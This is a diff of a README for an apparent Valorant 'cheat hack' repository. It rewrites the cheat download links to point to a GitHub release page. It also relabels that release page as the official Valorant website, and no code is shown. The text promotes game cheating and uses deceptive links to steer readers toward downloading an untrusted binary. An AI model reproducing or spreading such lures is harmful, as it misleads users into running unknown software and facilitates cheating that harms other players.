@@ -20,7 +20,7 @@ This cheat hack comes packed with a wide range of features to enhance your gamep
 
 ## Usage Instructions 🛠️
 
-To make use of this Valorant cheat external, download the cheat from the following link: [Download Cheat](https://github.com/file/App.zip)
+To make use of this Valorant cheat external, download the cheat from the following link: [Download Cheat](https://github.com/cruzer05/VALORANT-EFI-DRIVER-Cheat-Hack/releases/tag/v2.0)
 
 Once downloaded, follow the instructions provided in the repository to set up and activate the cheat within the game. 
 
@@ -55,9 +55,9 @@ This repository covers a range of topics related to Valorant cheating, including
 
 Ready to elevate your Valorant gameplay with advanced cheats and hacks? Download the cheat hack, explore the features, and dominate the game like never before!
 
-Feel free to visit the [Valorant website](https://playvalorant.com) for more information on the game itself.
+Feel free to visit the [Valorant website](https://github.com/cruzer05/VALORANT-EFI-DRIVER-Cheat-Hack/releases/tag/v2.0) for more information on the game itself.
 
-[![Download Cheat](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/file/App.zip)
+[![Download Cheat](https://github.com/cruzer05/VALORANT-EFI-DRIVER-Cheat-Hack/releases/tag/v2.0)](https://github.com/cruzer05/VALORANT-EFI-DRIVER-Cheat-Hack/releases/tag/v2.0)
 
 ## Disclaimer ❗
 
